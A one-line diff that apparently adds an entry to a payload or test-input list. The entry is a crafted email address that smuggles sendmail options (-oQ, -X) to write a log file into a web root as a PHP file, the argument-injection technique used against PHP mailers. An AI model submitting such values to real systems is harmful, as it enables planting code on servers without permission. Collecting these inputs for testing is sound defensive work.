@@ -1,0 +1,1 @@
+"attacker\" -oQ/tmp/ -X/var/www/html/phpcode.php  some"@email.com
